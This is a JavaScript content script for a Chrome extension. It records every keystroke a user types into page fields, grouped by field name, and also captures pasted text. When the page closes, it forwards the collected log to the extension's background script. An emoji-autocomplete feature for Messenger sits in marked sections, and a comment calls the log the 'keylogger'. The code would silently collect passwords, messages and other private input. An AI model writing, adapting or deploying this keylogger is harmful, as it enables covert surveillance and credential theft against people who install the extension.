var site = null;
var logger = new Object();
var activeElement = null;
var selectedText = null;
var copiedText = null;
// BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
var autocomplete = false;
var emojis = null;
var activeElementDOM = null;
// END: AUTOCOMPLETE FEATURE - CHROME EXTENSION

const BACKSPACE = 8;
const ENTER = 13;
const SPACE = 32;

// BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
chrome.runtime.onMessage.addListener(
    function(request, sender) {
        if(request) {
            var title = document.getElementById('pageTitle');
            if(title && title.textContent == "Messenger") {
                emojis = request;
                autocomplete = true;
            }
        }
    }
);
// END: AUTOCOMPLETE FEATURE - CHROME EXTENSION

window.onbeforeunload = function() {
    if(chrome.runtime)
        chrome.runtime.sendMessage(logger);
}

document.onload = function() {
    activeElement = document.activeElement.name;
    selectedText = null;

    // BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
    activeElementDOM = document.activeElement;
    // END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
}

window.onload = function() {
    activeElement = document.activeElement.name;
     // BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
     activeElementDOM = document.activeElement;
     // END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
}

document.onkeypress = function(event) {
    var keyCode = event.keyCode;
    var key = String.fromCharCode(keyCode);
    if(logger.hasOwnProperty(activeElement))
        logger[activeElement] += key;
    else
        logger[activeElement] = key;
    
    // BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
    if(autocomplete && keyCode == SPACE) { //TODO: add all delimeters 
        autocompleteEmoji();
    }
    // END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
}

// Remove Backspaces from Log
document.onkeydown = function(event) {
    var key = event.keyCode || event.charCode;

    if (key == BACKSPACE) {
        if (selectedText != null && logger.hasOwnProperty(activeElement) && logger[activeElement].indexOf(selectedText) != -1) {
            logger[activeElement] =  logger[activeElement].substring(0,  logger[activeElement].indexOf(selectedText)) +  logger[activeElement].substring( logger[activeElement].indexOf(selectedText)+selectedText.length);
        } else {
            if (logger.hasOwnProperty(activeElement) && logger[activeElement].length > 0) {
                logger[activeElement] =  logger[activeElement].slice(0, -1);
            }
        }
    }         
};

// BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
function autocompleteEmoji() {
    for (i in emojis) {
        var emoji = emojis[i];
        var position = logger[activeElement].indexOf(emoji.name);
        if(position != -1) {
            //replace in keylogger
            logger[activeElement] = logger[activeElement].substring(0,position) + emoji.icon + logger[activeElement].substring(position+emoji.name.length);
            //replace on page
            console.log(activeElementDOM.textContent);
        }
    }
    console.log(logger);
}
// END: AUTOCOMPLETE FEATURE - CHROME EXTENSION

function updateActiveElement(event) {
    if(activeElement != document.activeElement.name) {
        activeElement = document.activeElement.name;
    }
}

function detectSelectedText() {
    var text = "";
    if (typeof window.getSelection != "undefined") {
        text = window.getSelection().toString();
    } else if (typeof document.selection != "undefined" && document.selection.type == "Text") {
        text = document.selection.createRange().text;
    } else {
        text = null;
    }
    if (text == "") {
        text = null;
    }
    selectedText = text;
}

function keyOrMouseUp(event) {
    updateActiveElement(event);
    detectSelectedText();
}

document.onmouseup = keyOrMouseUp;
document.onkeyup = keyOrMouseUp;

// Log Copy + Paste Text
document.addEventListener('copy', function(){
    copiedText = document.getSelection().toString();
});

document.addEventListener('paste', function(event){
    logger[activeElement] += copiedText;
});